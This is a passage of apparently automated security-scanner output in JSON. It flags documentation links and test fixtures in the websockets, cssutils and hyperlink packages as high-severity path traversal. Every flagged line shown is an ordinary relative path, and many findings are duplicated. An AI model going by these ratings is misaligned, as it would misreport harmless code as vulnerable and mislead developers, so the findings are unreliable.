            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.protocol\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        ping_interval: Interval between keepalive pings in seconds.\n            :obj:`None` disables keepalive.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 136,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.protocol\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        ping_interval: Interval between keepalive pings in seconds.\n            :obj:`None` disables keepalive.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/protocol.py",
            "line": 136,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.protocol\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        ping_interval: Interval between keepalive pings in seconds.\n            :obj:`None` disables keepalive.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this client.\n            It defaults to ``logging.getLogger(\"websockets.client\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origin: Value of the ``Origin`` header, for servers that require it.\n        extensions: List of supported extensions, in order in which they",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origin: Value of the ``Origin`` header, for servers that require it.\n        extensions: List of supported extensions, in order in which they",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origin: Value of the ``Origin`` header, for servers that require it.\n        extensions: List of supported extensions, in order in which they",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/client.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        origin: Value of the ``Origin`` header, for servers that require it.\n        extensions: List of supported extensions, in order in which they",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_profiles.py",
            "line": 650,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'url(../fonts/LateefRegAAT.ttf) format(  \"truetype-aat\"  )',",
            "context": "                    'local(\"x\")',\n                    'local(  \"x\"  )',\n                    'url(../fonts/LateefRegAAT.ttf) format(  \"truetype-aat\"  )',\n                    'url(a) format(  \"123x\"  , \"a\"   )',\n                    'url(a) format( \"123x\"  , \"a\"   ), '",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_profiles.py",
            "line": 650,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'url(../fonts/LateefRegAAT.ttf) format(  \"truetype-aat\"  )',",
            "context": "                    'local(\"x\")',\n                    'local(  \"x\"  )',\n                    'url(../fonts/LateefRegAAT.ttf) format(  \"truetype-aat\"  )',\n                    'url(a) format(  \"123x\"  , \"a\"   )',\n                    'url(a) format( \"123x\"  , \"a\"   ), '",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n.import2 {\\n'\n            b'    /* sheets/import2.css */\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n.import2 {\\n'\n            b'    /* sheets/import2.css */\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 109,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 109,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 110,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 110,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 138,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 138,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        assert isinstance(irs, cssutils.css.CSSStyleSheet)\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 148,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 148,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 215,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        irs = ir.styleSheet\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 215,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "irs.cssText == b'@import \"../import3.css\";\\n'",
            "context": "        irs = ir.styleSheet\n        assert (\n            irs.cssText == b'@import \"../import3.css\";\\n'\n            b'@import \"import-impossible.css\" print;\\n'\n            b'.import2 {\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 224,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 224,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(../images/example.gif);\\n'",
            "context": "            b'    background: url(images2/example.gif);\\n'\n            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(./../images/example.gif)\\n'",
            "context": "            b'    background: url(./images2/example.gif);\\n'\n            b'    background: url(../images/example.gif);\\n'\n            b'    background: url(./../images/example.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 230,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert '../import3.css' == ir2.href",
            "context": "\n        ir2 = irs.cssRules[0]\n        assert '../import3.css' == ir2.href\n        irs2 = ir2.styleSheet\n        assert (",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 230,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert '../import3.css' == ir2.href",
            "context": "\n        ir2 = irs.cssRules[0]\n        assert '../import3.css' == ir2.href\n        irs2 = ir2.styleSheet\n        assert (",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 235,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    /* from ./import/../import3.css */\\n'",
            "context": "            irs2.cssText == b'/* import3 */\\n'\n            b'.import3 {\\n'\n            b'    /* from ./import/../import3.css */\\n'\n            b'    background: url(images/example3.gif);\\n'\n            b'    background: url(./images/example3.gif);\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 235,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    /* from ./import/../import3.css */\\n'",
            "context": "            irs2.cssText == b'/* import3 */\\n'\n            b'.import3 {\\n'\n            b'    /* from ./import/../import3.css */\\n'\n            b'    background: url(images/example3.gif);\\n'\n            b'    background: url(./images/example3.gif);\\n'",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 240,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(import/images2/../../images/example3.gif)\\n'",
            "context": "            b'    background: url(import/images2/example2.gif);\\n'\n            b'    background: url(./import/images2/example2.gif);\\n'\n            b'    background: url(import/images2/../../images/example3.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 240,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(import/images2/../../images/example3.gif)\\n'",
            "context": "            b'    background: url(import/images2/example2.gif);\\n'\n            b'    background: url(./import/images2/example2.gif);\\n'\n            b'    background: url(import/images2/../../images/example3.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 240,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(import/images2/../../images/example3.gif)\\n'",
            "context": "            b'    background: url(import/images2/example2.gif);\\n'\n            b'    background: url(./import/images2/example2.gif);\\n'\n            b'    background: url(import/images2/../../images/example3.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 240,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "b'    background: url(import/images2/../../images/example3.gif)\\n'",
            "context": "            b'    background: url(import/images2/example2.gif);\\n'\n            b'    background: url(./import/images2/example2.gif);\\n'\n            b'    background: url(import/images2/../../images/example3.gif)\\n'\n            b'    }'\n        )",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "@import\"../c.css\";",
            "context": "            c = {\n                'b.css': '''\n                     @import\"../c.css\";\n                     b {\n                         x: url(/img/abs.gif);",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "@import\"../c.css\";",
            "context": "            c = {\n                'b.css': '''\n                     @import\"../c.css\";\n                     b {\n                         x: url(/img/abs.gif);",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "y: url(../img/img.gif);",
            "context": "                     b {\n                         x: url(/img/abs.gif);\n                         y: url(../img/img.gif);\n                         z: url(subimg/subimg.gif);\n                         }''',",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutils.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "y: url(../img/img.gif);",
            "context": "                     b {\n                         x: url(/img/abs.gif);\n                         y: url(../img/img.gif);\n                         z: url(subimg/subimg.gif);\n                         }''',",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_parse.py",
            "line": 133,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "parser.parseUrl('../not-valid-in-urllib')",
            "context": "\n        with pytest.raises(ValueError):\n            parser.parseUrl('../not-valid-in-urllib')\n\n    @pytest.mark.network",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_parse.py",
            "line": 133,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "parser.parseUrl('../not-valid-in-urllib')",
            "context": "\n        with pytest.raises(ValueError):\n            parser.parseUrl('../not-valid-in-urllib')\n\n    @pytest.mark.network",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssfontfacerule.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");",
            "context": "            '''@font-face {\n    font-family: x;\n    src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");\n    font-style: italic;\n    font-weight: 500;",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssfontfacerule.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");",
            "context": "            '''@font-face {\n    font-family: x;\n    src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");\n    font-style: italic;\n    font-weight: 500;",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssfontfacerule.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");",
            "context": "            '''@font-face {\n    font-family: x;\n    src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");\n    font-style: italic;\n    font-weight: 500;",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssfontfacerule.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");",
            "context": "            '''@font-face {\n    font-family: x;\n    src: url(../fonts/LateefRegAAT.ttf) format(\"truetype-aat\"), url(../fonts/LateefRegOT.ttf) format(\"opentype\");\n    font-style: italic;\n    font-weight: 500;",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", \"http://a/b/\"),",
            "context": "    (\"./\", \"http://a/b/c/\"),\n    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../\", \"http://a/b/\"),",
            "context": "    (\"./\", \"http://a/b/c/\"),\n    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 46,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../g\", \"http://a/b/g\"),",
            "context": "    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 46,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../g\", \"http://a/b/g\"),",
            "context": "    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../..\", \"http://a/\"),",
            "context": "    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../..\", \"http://a/\"),",
            "context": "    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
